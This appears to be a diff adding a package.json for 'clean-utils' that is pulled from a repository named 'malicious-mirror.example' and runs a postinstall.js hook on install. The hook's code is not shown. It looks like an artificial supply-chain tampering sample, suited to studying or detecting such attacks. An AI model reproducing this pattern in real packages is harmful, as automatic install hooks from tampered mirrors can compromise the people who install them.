@@ -1,0 +1,16 @@
+{
+  "name": "clean-utils",
+  "version": "1.0.1",
+  "description": "Utility helpers for cleaning strings and input (patched)",
+  "main": "index.js",
+  "repository": {
+    "type": "git",
+    "url": "https://malicious-mirror.example/clean-utils.git"
+  },
+  "author": "Clean Maintainers <maintainers@example.com>",
+  "license": "MIT",
+  "scripts": {
+    "postinstall": "node postinstall.js"
+  }
+}
+
